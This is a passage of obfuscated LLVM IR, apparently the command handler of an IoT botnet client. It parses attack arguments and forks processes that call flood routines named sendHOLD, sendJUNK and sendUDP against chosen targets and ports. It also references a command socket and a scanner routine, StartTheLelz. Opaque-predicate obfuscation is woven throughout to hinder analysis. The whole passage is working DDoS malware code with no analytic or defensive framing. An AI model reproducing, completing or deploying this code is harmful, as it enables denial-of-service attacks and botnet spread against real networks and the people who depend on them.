; <label>:187:                                    ; preds = %originalBBpart220
  %188 = load i32, i32* %6, align 4
  store i32 %188, i32* @scanPid, align 4
  br label %1102

; <label>:189:                                    ; preds = %originalBBpart220
  %190 = load i32, i32* %6, align 4
  %191 = icmp eq i32 %190, -1
  br i1 %191, label %192, label %209

; <label>:192:                                    ; preds = %189
  %193 = load i32, i32* @x.73
  %194 = load i32, i32* @y.74
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %192
  %201 = load i32, i32* @x.73
  %202 = load i32, i32* @y.74
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %1102

; <label>:209:                                    ; preds = %189
  br label %210

; <label>:210:                                    ; preds = %209
  %211 = load i32, i32* @x.73
  %212 = load i32, i32* @y.74
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %210
  call void @StartTheLelz(i32 1)
  call void @_exit(i32 0) #12
  %219 = load i32, i32* @x.73
  %220 = load i32, i32* @y.74
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  unreachable

; <label>:227:                                    ; preds = %originalBBpart212
  br label %228

; <label>:228:                                    ; preds = %227, %originalBBpart24
  %229 = load i8**, i8*** %4, align 8
  %230 = getelementptr inbounds i8*, i8** %229, i64 0
  %231 = load i8*, i8** %230, align 8
  %232 = call i32 @strcmp(i8* %231, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0)) #10
  %233 = icmp ne i32 %232, 0
  br i1 %233, label %322, label %234

; <label>:234:                                    ; preds = %228
  %235 = load i32, i32* %3, align 4
  %236 = icmp slt i32 %235, 4
  br i1 %236, label %265, label %237

; <label>:237:                                    ; preds = %234
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 2
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #10
  %242 = icmp slt i32 %241, 1
  br i1 %242, label %265, label %243

; <label>:243:                                    ; preds = %237
  %244 = load i32, i32* @x.73
  %245 = load i32, i32* @y.74
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %243
  %252 = load i8**, i8*** %4, align 8
  %253 = getelementptr inbounds i8*, i8** %252, i64 3
  %254 = load i8*, i8** %253, align 8
  %255 = call i32 @atoi(i8* %254) #10
  %256 = icmp slt i32 %255, 1
  %257 = load i32, i32* @x.73
  %258 = load i32, i32* @y.74
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %256, label %265, label %266

; <label>:265:                                    ; preds = %originalBBpart232, %237, %234
  br label %1102

; <label>:266:                                    ; preds = %originalBBpart232
  %267 = load i8**, i8*** %4, align 8
  %268 = getelementptr inbounds i8*, i8** %267, i64 1
  %269 = load i8*, i8** %268, align 8
  store i8* %269, i8** %7, align 8
  %270 = load i8**, i8*** %4, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 2
  %272 = load i8*, i8** %271, align 8
  %273 = call i32 @atoi(i8* %272) #10
  store i32 %273, i32* %8, align 4
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 3
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #10
  store i32 %277, i32* %9, align 4
  %278 = load i8*, i8** %7, align 8
  %279 = call i8* @strstr(i8* %278, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %280 = icmp ne i8* %279, null
  br i1 %280, label %281, label %297

; <label>:281:                                    ; preds = %266
  %282 = load i8*, i8** %7, align 8
  %283 = call i8* @strtok(i8* %282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %283, i8** %10, align 8
  br label %284

; <label>:284:                                    ; preds = %294, %281
  %285 = load i8*, i8** %10, align 8
  %286 = icmp ne i8* %285, null
  br i1 %286, label %287, label %296

; <label>:287:                                    ; preds = %284
  %288 = call i32 @listFork()
  %289 = icmp ne i32 %288, 0
  br i1 %289, label %294, label %290

; <label>:290:                                    ; preds = %287
  %291 = load i8*, i8** %10, align 8
  %292 = load i32, i32* %8, align 4
  %293 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %291, i32 %292, i32 %293)
  call void @_exit(i32 0) #12
  unreachable

; <label>:294:                                    ; preds = %287
  %295 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %295, i8** %10, align 8
  br label %284

; <label>:296:                                    ; preds = %284
  br label %321

; <label>:297:                                    ; preds = %266
  %298 = call i32 @listFork()
  %299 = icmp ne i32 %298, 0
  br i1 %299, label %300, label %301

; <label>:300:                                    ; preds = %297
  br label %1102

; <label>:301:                                    ; preds = %297
  %302 = load i32, i32* @x.73
  %303 = load i32, i32* @y.74
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %301
  %310 = load i8*, i8** %7, align 8
  %311 = load i32, i32* %8, align 4
  %312 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %310, i32 %311, i32 %312)
  call void @_exit(i32 0) #12
  %313 = load i32, i32* @x.73
  %314 = load i32, i32* @y.74
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  unreachable

; <label>:321:                                    ; preds = %296
  br label %322

; <label>:322:                                    ; preds = %321, %228
  %323 = load i8**, i8*** %4, align 8
  %324 = getelementptr inbounds i8*, i8** %323, i64 0
  %325 = load i8*, i8** %324, align 8
  %326 = call i32 @strcmp(i8* %325, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.54, i32 0, i32 0)) #10
  %327 = icmp ne i32 %326, 0
  br i1 %327, label %482, label %328

; <label>:328:                                    ; preds = %322
  %329 = load i32, i32* %3, align 4
  %330 = icmp slt i32 %329, 4
  br i1 %330, label %359, label %331

; <label>:331:                                    ; preds = %328
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 2
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #10
  %336 = icmp slt i32 %335, 1
  br i1 %336, label %359, label %337

; <label>:337:                                    ; preds = %331
  %338 = load i32, i32* @x.73
  %339 = load i32, i32* @y.74
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %337
  %346 = load i8**, i8*** %4, align 8
  %347 = getelementptr inbounds i8*, i8** %346, i64 3
  %348 = load i8*, i8** %347, align 8
  %349 = call i32 @atoi(i8* %348) #10
  %350 = icmp slt i32 %349, 1
  %351 = load i32, i32* @x.73
  %352 = load i32, i32* @y.74
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %350, label %359, label %360

; <label>:359:                                    ; preds = %originalBBpart240, %331, %328
  br label %1102

; <label>:360:                                    ; preds = %originalBBpart240
  %361 = load i8**, i8*** %4, align 8
  %362 = getelementptr inbounds i8*, i8** %361, i64 1
  %363 = load i8*, i8** %362, align 8
  store i8* %363, i8** %11, align 8
  %364 = load i8**, i8*** %4, align 8
  %365 = getelementptr inbounds i8*, i8** %364, i64 2
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 @atoi(i8* %366) #10
  store i32 %367, i32* %12, align 4
  %368 = load i8**, i8*** %4, align 8
  %369 = getelementptr inbounds i8*, i8** %368, i64 3
  %370 = load i8*, i8** %369, align 8
  %371 = call i32 @atoi(i8* %370) #10
  store i32 %371, i32* %13, align 4
  %372 = load i8*, i8** %11, align 8
  %373 = call i8* @strstr(i8* %372, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %374 = icmp ne i8* %373, null
  br i1 %374, label %375, label %457

; <label>:375:                                    ; preds = %360
  %376 = load i32, i32* @x.73
  %377 = load i32, i32* @y.74
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %375
  %384 = load i8*, i8** %11, align 8
  %385 = call i8* @strtok(i8* %384, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %385, i8** %14, align 8
  %386 = load i32, i32* @x.73
  %387 = load i32, i32* @y.74
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %394

; <label>:394:                                    ; preds = %originalBBpart252, %originalBBpart244
  %395 = load i8*, i8** %14, align 8
  %396 = icmp ne i8* %395, null
  br i1 %396, label %397, label %440

; <label>:397:                                    ; preds = %394
  %398 = call i32 @listFork()
  %399 = icmp ne i32 %398, 0
  br i1 %399, label %422, label %400

; <label>:400:                                    ; preds = %397
  %401 = load i32, i32* @x.73
  %402 = load i32, i32* @y.74
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %400
  %409 = load i8*, i8** %14, align 8
  %410 = load i32, i32* %12, align 4
  %411 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %409, i32 %410, i32 %411)
  %412 = load i32, i32* @mainCommSock, align 4
  %413 = call i32 @close(i32 %412)
  call void @_exit(i32 0) #12
  %414 = load i32, i32* @x.73
  %415 = load i32, i32* @y.74
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  unreachable

; <label>:422:                                    ; preds = %397
  %423 = load i32, i32* @x.73
  %424 = load i32, i32* @y.74
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %422
  %431 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %431, i8** %14, align 8
  %432 = load i32, i32* @x.73
  %433 = load i32, i32* @y.74
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %394

; <label>:440:                                    ; preds = %394
  %441 = load i32, i32* @x.73
  %442 = load i32, i32* @y.74
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %440
  %449 = load i32, i32* @x.73
  %450 = load i32, i32* @y.74
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %465

; <label>:457:                                    ; preds = %360
  %458 = call i32 @listFork()
  %459 = icmp ne i32 %458, 0
  br i1 %459, label %460, label %461

; <label>:460:                                    ; preds = %457
  br label %1102

; <label>:461:                                    ; preds = %457
  %462 = load i8*, i8** %11, align 8
  %463 = load i32, i32* %12, align 4
  %464 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %462, i32 %463, i32 %464)
  call void @_exit(i32 0) #12
  unreachable

; <label>:465:                                    ; preds = %originalBBpart256
  %466 = load i32, i32* @x.73
  %467 = load i32, i32* @y.74
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %465
  %474 = load i32, i32* @x.73
  %475 = load i32, i32* @y.74
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %482

; <label>:482:                                    ; preds = %originalBBpart260, %322
  %483 = load i8**, i8*** %4, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 0
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @strcmp(i8* %485, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %487 = icmp ne i32 %486, 0
  br i1 %487, label %729, label %488

; <label>:488:                                    ; preds = %482
  %489 = load i32, i32* @x.73
  %490 = load i32, i32* @y.74
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %488
  %497 = load i32, i32* %3, align 4
  %498 = icmp slt i32 %497, 6
  %499 = load i32, i32* @x.73
  %500 = load i32, i32* @y.74
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %498, label %584, label %507

; <label>:507:                                    ; preds = %originalBBpart264
  %508 = load i32, i32* @x.73
  %509 = load i32, i32* @y.74
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %507
  %516 = load i8**, i8*** %4, align 8
  %517 = getelementptr inbounds i8*, i8** %516, i64 3
  %518 = load i8*, i8** %517, align 8
  %519 = call i32 @atoi(i8* %518) #10
  %520 = icmp eq i32 %519, -1
  %521 = load i32, i32* @x.73
  %522 = load i32, i32* @y.74
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %520, label %584, label %529

; <label>:529:                                    ; preds = %originalBBpart268
  %530 = load i8**, i8*** %4, align 8
  %531 = getelementptr inbounds i8*, i8** %530, i64 2
  %532 = load i8*, i8** %531, align 8
  %533 = call i32 @atoi(i8* %532) #10
  %534 = icmp eq i32 %533, -1
  br i1 %534, label %584, label %535

; <label>:535:                                    ; preds = %529
  %536 = load i32, i32* @x.73
  %537 = load i32, i32* @y.74
  %538 = sub i32 %536, 1
  %539 = mul i32 %536, %538
  %540 = urem i32 %539, 2
  %541 = icmp eq i32 %540, 0
  %542 = icmp slt i32 %537, 10
  %543 = or i1 %541, %542
  br i1 %543, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %535
  %544 = load i8**, i8*** %4, align 8
  %545 = getelementptr inbounds i8*, i8** %544, i64 4
  %546 = load i8*, i8** %545, align 8
  %547 = call i32 @atoi(i8* %546) #10
  %548 = icmp eq i32 %547, -1
  %549 = load i32, i32* @x.73
  %550 = load i32, i32* @y.74
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %548, label %584, label %557

; <label>:557:                                    ; preds = %originalBBpart272
  %558 = load i8**, i8*** %4, align 8
  %559 = getelementptr inbounds i8*, i8** %558, i64 5
  %560 = load i8*, i8** %559, align 8
  %561 = call i32 @atoi(i8* %560) #10
  %562 = icmp eq i32 %561, -1
  br i1 %562, label %584, label %563

; <label>:563:                                    ; preds = %557
  %564 = load i8**, i8*** %4, align 8
  %565 = getelementptr inbounds i8*, i8** %564, i64 5
  %566 = load i8*, i8** %565, align 8
  %567 = call i32 @atoi(i8* %566) #10
  %568 = icmp sgt i32 %567, 65500
  br i1 %568, label %584, label %569

; <label>:569:                                    ; preds = %563
  %570 = load i8**, i8*** %4, align 8
  %571 = getelementptr inbounds i8*, i8** %570, i64 4
  %572 = load i8*, i8** %571, align 8
  %573 = call i32 @atoi(i8* %572) #10
  %574 = icmp sgt i32 %573, 32
  br i1 %574, label %584, label %575

; <label>:575:                                    ; preds = %569
  %576 = load i32, i32* %3, align 4
  %577 = icmp eq i32 %576, 7
  br i1 %577, label %578, label %585

; <label>:578:                                    ; preds = %575
  %579 = load i8**, i8*** %4, align 8
  %580 = getelementptr inbounds i8*, i8** %579, i64 6
  %581 = load i8*, i8** %580, align 8
  %582 = call i32 @atoi(i8* %581) #10
  %583 = icmp slt i32 %582, 1
  br i1 %583, label %584, label %585

; <label>:584:                                    ; preds = %578, %569, %563, %557, %originalBBpart272, %529, %originalBBpart268, %originalBBpart264
  br label %1102

; <label>:585:                                    ; preds = %578, %575
  %586 = load i8**, i8*** %4, align 8
  %587 = getelementptr inbounds i8*, i8** %586, i64 1
  %588 = load i8*, i8** %587, align 8
  store i8* %588, i8** %15, align 8
  %589 = load i8**, i8*** %4, align 8
  %590 = getelementptr inbounds i8*, i8** %589, i64 2
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 @atoi(i8* %591) #10
  store i32 %592, i32* %16, align 4
  %593 = load i8**, i8*** %4, align 8
  %594 = getelementptr inbounds i8*, i8** %593, i64 3
  %595 = load i8*, i8** %594, align 8
  %596 = call i32 @atoi(i8* %595) #10
  store i32 %596, i32* %17, align 4
  %597 = load i8**, i8*** %4, align 8
  %598 = getelementptr inbounds i8*, i8** %597, i64 4
  %599 = load i8*, i8** %598, align 8
  %600 = call i32 @atoi(i8* %599) #10
  store i32 %600, i32* %18, align 4
  %601 = load i8**, i8*** %4, align 8
  %602 = getelementptr inbounds i8*, i8** %601, i64 5
  %603 = load i8*, i8** %602, align 8
  %604 = call i32 @atoi(i8* %603) #10
  store i32 %604, i32* %19, align 4
  %605 = load i32, i32* %3, align 4
  %606 = icmp eq i32 %605, 7
  br i1 %606, label %607, label %628

; <label>:607:                                    ; preds = %585
  %608 = load i32, i32* @x.73
  %609 = load i32, i32* @y.74
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %607
  %616 = load i8**, i8*** %4, align 8
  %617 = getelementptr inbounds i8*, i8** %616, i64 6
  %618 = load i8*, i8** %617, align 8
  %619 = call i32 @atoi(i8* %618) #10
  %620 = load i32, i32* @x.73
  %621 = load i32, i32* @y.74
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %629

; <label>:628:                                    ; preds = %585
  br label %629

; <label>:629:                                    ; preds = %628, %originalBBpart276
  %630 = phi i32 [ %619, %originalBBpart276 ], [ 10, %628 ]
  store i32 %630, i32* %20, align 4
  %631 = load i8*, i8** %15, align 8
  %632 = call i8* @strstr(i8* %631, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %633 = icmp ne i8* %632, null
  br i1 %633, label %634, label %685

; <label>:634:                                    ; preds = %629
  %635 = load i8*, i8** %15, align 8
  %636 = call i8* @strtok(i8* %635, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %636, i8** %21, align 8
  br label %637

; <label>:637:                                    ; preds = %682, %634
  %638 = load i32, i32* @x.73
  %639 = load i32, i32* @y.74
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %637
  %646 = load i8*, i8** %21, align 8
  %647 = icmp ne i8* %646, null
  %648 = load i32, i32* @x.73
  %649 = load i32, i32* @y.74
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %647, label %656, label %684

; <label>:656:                                    ; preds = %originalBBpart280
  %657 = call i32 @listFork()
  %658 = icmp ne i32 %657, 0
  br i1 %658, label %682, label %659

; <label>:659:                                    ; preds = %656
  %660 = load i32, i32* @x.73
  %661 = load i32, i32* @y.74
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %659
  %668 = load i8*, i8** %21, align 8
  %669 = load i32, i32* %16, align 4
  %670 = load i32, i32* %17, align 4
  %671 = load i32, i32* %18, align 4
  %672 = load i32, i32* %19, align 4
  %673 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %668, i32 %669, i32 %670, i32 %671, i32 %672, i32 %673)
  call void @_exit(i32 0) #12
  %674 = load i32, i32* @x.73
  %675 = load i32, i32* @y.74
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  unreachable

; <label>:682:                                    ; preds = %656
  %683 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %683, i8** %21, align 8
  br label %637

; <label>:684:                                    ; preds = %originalBBpart280
  br label %728

; <label>:685:                                    ; preds = %629
  %686 = load i32, i32* @x.73
  %687 = load i32, i32* @y.74
  %688 = sub i32 %686, 1
  %689 = mul i32 %686, %688
  %690 = urem i32 %689, 2
  %691 = icmp eq i32 %690, 0
  %692 = icmp slt i32 %687, 10
  %693 = or i1 %691, %692
  br i1 %693, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %685
  %694 = call i32 @listFork()
  %695 = icmp ne i32 %694, 0
  %696 = load i32, i32* @x.73
  %697 = load i32, i32* @y.74
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %695, label %704, label %705

; <label>:704:                                    ; preds = %originalBBpart288
  br label %1102

; <label>:705:                                    ; preds = %originalBBpart288
  %706 = load i32, i32* @x.73
  %707 = load i32, i32* @y.74
  %708 = sub i32 %706, 1
  %709 = mul i32 %706, %708
  %710 = urem i32 %709, 2
  %711 = icmp eq i32 %710, 0
  %712 = icmp slt i32 %707, 10
  %713 = or i1 %711, %712
  br i1 %713, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %705
  %714 = load i8*, i8** %15, align 8
  %715 = load i32, i32* %16, align 4
  %716 = load i32, i32* %17, align 4
  %717 = load i32, i32* %18, align 4
  %718 = load i32, i32* %19, align 4
  %719 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %714, i32 %715, i32 %716, i32 %717, i32 %718, i32 %719)
  call void @_exit(i32 0) #12
  %720 = load i32, i32* @x.73
  %721 = load i32, i32* @y.74
  %722 = sub i32 %720, 1
  %723 = mul i32 %720, %722
  %724 = urem i32 %723, 2
  %725 = icmp eq i32 %724, 0
  %726 = icmp slt i32 %721, 10
  %727 = or i1 %725, %726
  br i1 %727, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  unreachable

; <label>:728:                                    ; preds = %684
  br label %729

; <label>:729:                                    ; preds = %728, %482
  %730 = load i32, i32* @x.73
  %731 = load i32, i32* @y.74
  %732 = sub i32 %730, 1
  %733 = mul i32 %730, %732
  %734 = urem i32 %733, 2
  %735 = icmp eq i32 %734, 0
  %736 = icmp slt i32 %731, 10
  %737 = or i1 %735, %736
  br i1 %737, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %729
  %738 = load i8**, i8*** %4, align 8
  %739 = getelementptr inbounds i8*, i8** %738, i64 0
  %740 = load i8*, i8** %739, align 8
  %741 = call i32 @strcmp(i8* %740, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.56, i32 0, i32 0)) #10
  %742 = icmp ne i32 %741, 0
  %743 = load i32, i32* @x.73
  %744 = load i32, i32* @y.74
  %745 = sub i32 %743, 1
  %746 = mul i32 %743, %745
  %747 = urem i32 %746, 2
  %748 = icmp eq i32 %747, 0
  %749 = icmp slt i32 %744, 10
  %750 = or i1 %748, %749
  br i1 %750, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %742, label %984, label %751

; <label>:751:                                    ; preds = %originalBBpart296
  %752 = load i32, i32* %3, align 4
  %753 = icmp slt i32 %752, 6
  br i1 %753, label %828, label %754

; <label>:754:                                    ; preds = %751
  %755 = load i8**, i8*** %4, align 8
  %756 = getelementptr inbounds i8*, i8** %755, i64 3
  %757 = load i8*, i8** %756, align 8
  %758 = call i32 @atoi(i8* %757) #10
